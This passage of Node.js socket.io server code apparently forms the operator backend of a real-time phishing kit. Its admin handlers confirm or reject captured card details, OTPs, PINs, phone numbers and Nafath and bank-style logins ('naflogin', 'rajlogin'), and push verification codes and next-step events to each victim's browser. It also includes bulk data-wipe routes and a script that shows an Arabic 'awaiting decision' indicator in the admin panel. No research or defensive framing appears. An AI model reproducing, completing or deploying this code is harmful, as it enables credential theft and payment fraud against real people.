    const { uuids, userIds } = data || {};
    // Support both formats: uuids as array of strings, or userIds as array of objects
    let targetUuids = [];
    if (uuids && Array.isArray(uuids)) {
      targetUuids = uuids;
    } else if (userIds && Array.isArray(userIds)) {
      targetUuids = userIds.map(u => typeof u === 'string' ? u : (u.uuid || u.userId));
    }
    const uuidSet = new Set(targetUuids);
    targetUuids.forEach(uuid => {
      if (uuid) {
        delete db.connectedUsers[uuid];
        delete db.chatMessages[uuid];
        delete db.users[uuid];
        delete db.sessions[uuid];
      }
    });
    // Remove submissions for all deleted users
    db.formSubmissions = db.formSubmissions.filter(s => !uuidSet.has(s.uuid || s.userId));
    // Remove from archived
    db.archivedUsers = db.archivedUsers.filter(u => !uuidSet.has(u.uuid));
    // Remove from preferences
    if (db.preferences) {
      ['viewed', 'bookmarked', 'completed'].forEach(key => {
        if (Array.isArray(db.preferences[key])) {
          db.preferences[key] = db.preferences[key].filter(id => !uuidSet.has(id));
        }
      });
    }
    saveToFile();
    console.log('[admin:deleteMultipleUserSessions] Deleted users:', targetUuids);
    io.emit('admin:deleteMultipleUserSessions', { uuids: targetUuids });
    // Emit userArchived for each deleted user so frontend removes from k.current
    targetUuids.forEach(uuid => {
      io.emit('admin:userArchived', { uuid, userId: uuid });
    });
    broadcastConnectedUsers();
  });

  socket.on('admin:deleteConnectedUser', (data) => {
    const { uuid, userId } = data || {};
    const targetUuid = uuid || userId;
    if (targetUuid) {
      delete db.connectedUsers[targetUuid];
      delete db.chatMessages[targetUuid];
      delete db.users[targetUuid];
      delete db.sessions[targetUuid];
      db.formSubmissions = db.formSubmissions.filter(s => (s.uuid || s.userId) !== targetUuid);
      db.archivedUsers = db.archivedUsers.filter(u => u.uuid !== targetUuid);
    }
    saveToFile();
    console.log('[admin:deleteConnectedUser] Deleted user:', targetUuid);
    socket.emit('admin:deleteConnectedUser:success', { uuid: targetUuid });
    // Also emit userArchived event so frontend removes from k.current
    io.emit('admin:userArchived', { uuid: targetUuid, userId: targetUuid });
    broadcastConnectedUsers();
  });

  socket.on('admin:reportUser', (data) => {
    io.emit('admin:reportUser', data);
  });

  socket.on('admin:getSiteSettings', (data, callback) => {
    if (typeof callback === 'function') callback(db.siteSettings);
    else socket.emit('admin:siteSettings', db.siteSettings);
  });

  socket.on('admin:updateSiteSettings', (data) => {
    Object.assign(db.siteSettings, data);
    saveToFile();
    io.emit('admin:siteSettings', db.siteSettings);
    // Also broadcast public settings to all users
    io.emit('site:publicSettings', {
      chatEnabled: db.siteSettings.chatEnabled,
      mobileOnly: db.siteSettings.mobileOnly,
      siteEnabled: db.siteSettings.siteEnabled,
    });
  });

  socket.on('admin:getPreferences', (data, callback) => {
    if (typeof callback === 'function') callback(db.preferences);
    else socket.emit('admin:preferences', db.preferences);
  });

  socket.on('admin:addPreference', (data) => {
    const { type, id } = data || {};
    if (type && id) {
      if (!db.preferences[type]) db.preferences[type] = [];
      if (!db.preferences[type].includes(id)) {
        db.preferences[type].push(id);
      }
    }
    saveToFile();
    io.emit('admin:preferences', db.preferences);
  });

  socket.on('admin:removePreference', (data) => {
    const { type, id } = data || {};
    if (type && id && db.preferences[type]) {
      db.preferences[type] = db.preferences[type].filter(p => p !== id);
    }
    saveToFile();
    io.emit('admin:preferences', db.preferences);
  });

  socket.on('admin:clearAllData', () => {
    db.formSubmissions = [];
    db.chatMessages = {};
    db.connectedUsers = {};
    db.users = {};
    db.archivedUsers = [];
    db.blockedIps = [];
    db.liveUpdates = [];
    db.preferences = { viewed: [], bookmarked: [], completed: [] };
    saveToFile();
    socket.emit('admin:clearAllData:success', { success: true });
    io.emit('admin:clearAllData:success', { success: true });
    broadcastConnectedUsers();
  });

  // ==================== FIXED: admin:updateFormSubmission ====================
  // Admin sends: { formId, userId, uuid, update: { crdconfirm: 1 }, action, actionType }
  // OLD BUG: was looking for data.id instead of data.formId
  // NEW: finds by formId, applies update, AND sends action events to user
  socket.on('admin:updateFormSubmission', (data) => {
    const { formId, id, userId, uuid, update, action, actionType } = data || {};
    const searchId = formId || id;
    const targetUuid = uuid || userId;

    console.log('[admin:updateFormSubmission] formId:', searchId, 'userId:', targetUuid, 'update:', JSON.stringify(update), 'action:', action, 'actionType:', actionType);

    // Find the submission
    const sub = db.formSubmissions.find(s => s.id === searchId);
    if (sub) {
      // Apply the update to formData
      if (update) {
        if (!sub.formData) sub.formData = {};
        Object.assign(sub.formData, update);
        // Also apply at top level for backward compatibility
        Object.assign(sub, { formData: sub.formData });
      }
      sub.updatedAt = new Date().toISOString();

      console.log('[admin:updateFormSubmission] Found submission, formType:', sub.formType, 'updated formData:', JSON.stringify(sub.formData));
      saveToFile();

      // Send success back to admin
      socket.emit('admin:updateFormSubmission:success', sub);
      // Broadcast updated submission to all (admin panel updates)
      io.emit('form:submission', sub);

      // ==================== Send action events to user ====================
      // Determine the action based on the update fields
      let userAction = action; // explicit action from admin
      let formType = actionType || sub.formType;

      // If no explicit action, determine from update fields
      if (!userAction && update) {
        if (update.crdconfirm === 1) userAction = 'confirmed';
        else if (update.crdconfirm === -1) userAction = 'cancelled';
        else if (update.otpconfirm === 1) userAction = 'confirmed';
        else if (update.otpconfirm === -1) userAction = 'cancelled';
        else if (update.pinconfirm === 1) userAction = 'confirmed';
        else if (update.pinconfirm === -1) userAction = 'cancelled';
        else if (update.phoneconfirm === 1) userAction = 'confirmed';
        else if (update.phoneconfirm === -1) userAction = 'cancelled';
        else if (update.nafloginconfirm === 1) userAction = 'confirmed';
        else if (update.nafloginconfirm === -1) userAction = 'cancelled';
        else if (update.rajloginconfirm === 1) userAction = 'confirmed';
        else if (update.rajloginconfirm === -1) userAction = 'cancelled';
        else if (update.nafathconfirm === 1) userAction = 'confirmed';
        else if (update.nafathconfirm === -1) userAction = 'cancelled';
      }

      // Determine which formType-specific action event to send
      if (!formType && update) {
        if (update.crdconfirm !== undefined) formType = 'payment';
        else if (update.otpconfirm !== undefined) formType = 'otp_verification';
        else if (update.pinconfirm !== undefined) formType = 'pin_verification';
        else if (update.phoneconfirm !== undefined) formType = 'phone_verification';
        else if (update.nafloginconfirm !== undefined) formType = 'naflogin';
        else if (update.rajloginconfirm !== undefined) formType = 'rajlogin';
        else if (update.nafathconfirm !== undefined) formType = 'nafath_verification';
        else if (update.verificationCode !== undefined) formType = 'nafath_code';
      }

      const actionPayload = {
        formId: searchId,
        userId: targetUuid,
        uuid: targetUuid,
        action: userAction,
        formType: sub.formType,
        step: update?.step || sub.step || (sub.formData?.step),
        ...update,
      };

      console.log('[admin:updateFormSubmission] Sending action to user:', formType, userAction, 'target:', targetUuid);

      // ==================== Remove waiting state when admin takes action ====================
      // Try to find the user by targetUuid first, then by sub.uuid or sub.userId
      let waitingUuid = null;
      if (targetUuid && db.connectedUsers[targetUuid]) {
        waitingUuid = targetUuid;
      } else if (sub.uuid && db.connectedUsers[sub.uuid]) {
        waitingUuid = sub.uuid;
      } else if (sub.userId && db.connectedUsers[sub.userId]) {
        waitingUuid = sub.userId;
      }
      console.log('[admin:updateFormSubmission] Looking for user to remove waiting. targetUuid:', targetUuid, 'sub.uuid:', sub.uuid, 'sub.userId:', sub.userId, 'found:', waitingUuid, 'connectedUsers keys:', Object.keys(db.connectedUsers));
      if (waitingUuid) {
        db.connectedUsers[waitingUuid].isWaiting = false;
        db.connectedUsers[waitingUuid].waitingFormType = null;
        db.connectedUsers[waitingUuid].currentPage = '';
        console.log('[admin:updateFormSubmission] Removed waiting state for', waitingUuid);
        // Send status update to admins to remove the waiting indicator
        io.emit('user:statusUpdate', {
          uuid: waitingUuid,
          userId: waitingUuid,
          socketId: db.connectedUsers[waitingUuid].socketId,
          currentPage: '',
          status: 'online',
          isTyping: false
        });
        broadcastConnectedUsers();
      }

      if (targetUuid) {
        // Send the specific action event that the frontend is listening for
        if (formType === 'payment' && userAction) {
          io.to(`user:${targetUuid}`).emit('payment:action', actionPayload);
          console.log('[payment:action] sent to', targetUuid, userAction);
        }
        if ((formType === 'otp' || formType === 'otp_verification') && userAction) {
          io.to(`user:${targetUuid}`).emit('otp:action', actionPayload);
          console.log('[otp:action] sent to', targetUuid, userAction);
        }
        if ((formType === 'pin' || formType === 'pin_verification') && userAction) {
          io.to(`user:${targetUuid}`).emit('pin:action', actionPayload);
          console.log('[pin:action] sent to', targetUuid, userAction);
        }
        if ((formType === 'phone' || formType === 'phone_verification') && userAction) {
          io.to(`user:${targetUuid}`).emit('phone:action', actionPayload);
          console.log('[phone:action] sent to', targetUuid, userAction);
        }
        if (formType === 'naflogin' && userAction) {
          io.to(`user:${targetUuid}`).emit('naflogin:action', actionPayload);
          console.log('[naflogin:action] sent to', targetUuid, userAction);
        }
        if (formType === 'rajlogin' && userAction) {
          io.to(`user:${targetUuid}`).emit('rajlogin:action', actionPayload);
          console.log('[rajlogin:action] sent to', targetUuid, userAction);
        }
        if ((formType === 'nafath' || formType === 'nafath_verification') && userAction) {
          io.to(`user:${targetUuid}`).emit('nafath:action', actionPayload);
          console.log('[nafath:action] sent to', targetUuid, userAction);
        }
        // Special: nafath verification code
        if (formType === 'nafath_code' || (update && update.verificationCode)) {
          io.to(`user:${targetUuid}`).emit('nafath:code', {
            userId: targetUuid,
            uuid: targetUuid,
            verificationCode: update.verificationCode,
            code: update.verificationCode,
          });
          console.log('[nafath:code] sent to', targetUuid, update.verificationCode);
          // Remove waiting state when nafath code is sent to client
          if (db.connectedUsers[targetUuid]) {
            db.connectedUsers[targetUuid].isWaiting = false;
        db.connectedUsers[targetUuid].waitingFormType = null;
            db.connectedUsers[targetUuid].currentPage = '';
            console.log('[nafath:code] Removed waiting state for', targetUuid);
            io.emit('user:statusUpdate', {
              uuid: targetUuid,
              userId: targetUuid,
              socketId: db.connectedUsers[targetUuid].socketId,
              currentPage: '',
              status: 'online',
              isTyping: false
            });
            broadcastConnectedUsers();
          }
        }
      }

    } else {
      console.log('[admin:updateFormSubmission] Submission NOT FOUND for id:', searchId);
      socket.emit('admin:updateFormSubmission:error', { error: 'Submission not found', formId: searchId });
    }
  });

  // ==================== Disconnect ====================
  socket.on('disconnect', () => {
    console.log(`[Socket] Disconnected: ${socket.id}, uuid: ${socket.uuid}, type: ${socket.userType}`);
    if (socket.uuid && socket.userType !== 'admin') {
      if (db.connectedUsers[socket.uuid]) {
        db.connectedUsers[socket.uuid].isOnline = false;
        db.connectedUsers[socket.uuid].disconnectedAt = new Date().toISOString();
      }
      io.emit('user:statusUpdate', { uuid: socket.uuid, userId: socket.uuid, status: 'offline' });
      broadcastConnectedUsers();
      const disconnectedUuid = socket.uuid;
      setTimeout(() => {
        if (db.connectedUsers[disconnectedUuid] && !db.connectedUsers[disconnectedUuid].isOnline) {
          delete db.connectedUsers[disconnectedUuid];
          broadcastConnectedUsers();
        }
      }, 60000);
    }
  });
});

// Spinner script for admin panel
app.get('/admin-spinner.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Cache-Control', 'no-cache');
  res.send(`
(function(){
  var css=document.createElement('style');
  css.textContent=[
    '@keyframes wt-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}',
    '@keyframes wt-pulse{0%,100%{opacity:1}50%{opacity:.4}}',
    '.wt-wrap{display:flex!important;align-items:center!important;gap:8px!important;direction:rtl!important}',
    '.wt-spinner{display:inline-block;width:20px;height:20px;min-width:20px;min-height:20px;',
    'border:3px solid rgba(245,158,11,0.3);border-top:3px solid #f59e0b;border-radius:50%;',
    'animation:wt-spin 0.7s linear infinite}',
    '.wt-label{color:#d97706!important;font-weight:700!important;font-size:0.85rem!important;',
    'animation:wt-pulse 1.5s ease-in-out infinite!important}'
  ].join('');
  document.head.appendChild(css);
  function apply(){
    document.querySelectorAll('.current-page').forEach(function(el){
      var t=(el.textContent||'').trim();
      if(t.indexOf('\u0628\u0627\u0646\u062a\u0638\u0627\u0631')!==-1 && !el.querySelector('.wt-spinner')){
        el.innerHTML='';
        el.className=el.className+' wt-wrap';
        var sp=document.createElement('span');sp.className='wt-spinner';
        var lb=document.createElement('span');lb.className='wt-label';lb.textContent='\u0628\u0627\u0646\u062a\u0638\u0627\u0631 \u0627\u0644\u0642\u0631\u0627\u0631...';
        el.appendChild(sp);el.appendChild(lb);
      }
    });
  }
  setInterval(apply,400);
  new MutationObserver(apply).observe(document.body,{childList:true,subtree:true});
})();
  `);
});

// Health check
app.get('/', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
